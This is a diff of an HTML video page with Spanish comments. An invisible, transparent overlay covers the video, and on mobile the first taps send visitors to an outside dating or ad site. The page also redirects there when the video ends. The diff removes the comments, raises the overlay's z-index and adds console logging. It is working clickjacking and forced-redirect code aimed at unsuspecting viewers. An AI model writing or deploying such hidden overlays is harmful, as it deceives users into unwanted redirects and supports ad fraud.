@@ -26,15 +26,15 @@
       display: block;
     }
 
-    /* Overlay invisible para capturar clics */
     .overlay {
       position: absolute;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(0, 0, 0, 0);
+      background: rgba(255, 255, 255, 0); /* Transparente */
       cursor: pointer;
+      z-index: 10;
     }
   </style>
 </head>
@@ -45,14 +45,13 @@
       <source src="https://cdn.videy.co/9F2XDRa6.mp4" type="video/mp4">
       Tu navegador no soporta la reproducción de videos.
     </video>
-    <div id="videoOverlay" class="overlay"></div> <!-- Captura clics -->
+    <div id="videoOverlay" class="overlay"></div>
   </div>
 
   <script>
     const redirectUrl = 'https://datingprudethimble.com/2056090'; 
     const maxRedirects = 2;
 
-    // Control de sesión
     if (!sessionStorage.getItem('sessionStarted')) {
         localStorage.removeItem('clickCount');
         sessionStorage.setItem('sessionStarted', 'true');
@@ -62,26 +61,26 @@
     const videoPlayer = document.getElementById('videoPlayer');
     const videoOverlay = document.getElementById('videoOverlay');
 
-    // Función para manejar redirecciones
     function handleRedirect(event) {
+        console.log("Click detectado en overlay"); // Verificación
         clickCount++;
         localStorage.setItem('clickCount', clickCount);
 
         if (clickCount <= maxRedirects) {
+            console.log("Redirigiendo a:", redirectUrl);
             window.location.href = redirectUrl;
             event.preventDefault();
         } else {
-            videoOverlay.style.display = 'none'; // Desactiva el overlay
-            videoPlayer.setAttribute('controls', 'controls'); // Muestra controles
+            videoOverlay.style.display = 'none';
+            videoPlayer.setAttribute('controls', 'controls');
         }
     }
 
-    // Evento cuando finaliza el video
     function handleVideoEnd() {
+        console.log("Video finalizado, redirigiendo...");
         window.location.href = redirectUrl;
     }
 
-    // Agregar eventos cuando la página cargue
     document.addEventListener("DOMContentLoaded", function() {
         if (videoPlayer) {
             videoPlayer.addEventListener('ended', handleVideoEnd);
@@ -90,7 +89,6 @@
             }
         }
 
-        // Solo activar el overlay en móviles
         if (/Mobi|Android/i.test(navigator.userAgent) && videoOverlay) {
             videoOverlay.addEventListener('click', handleRedirect, true);
             videoOverlay.addEventListener('touchstart', handleRedirect, true);
